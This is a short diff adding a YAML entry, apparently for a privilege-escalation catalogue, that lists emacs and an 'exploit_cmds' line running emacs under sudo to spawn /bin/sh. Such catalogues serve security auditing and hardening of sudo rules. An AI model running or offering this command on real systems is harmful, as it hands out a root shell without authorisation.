@@ -1,0 +1,4 @@
+name: emacs
+binary_path: /usr/bin/emacs
+exploit_cmds:
+- sudo /usr/bin/emacs -Q -nw --eval '(term "/bin/sh")'
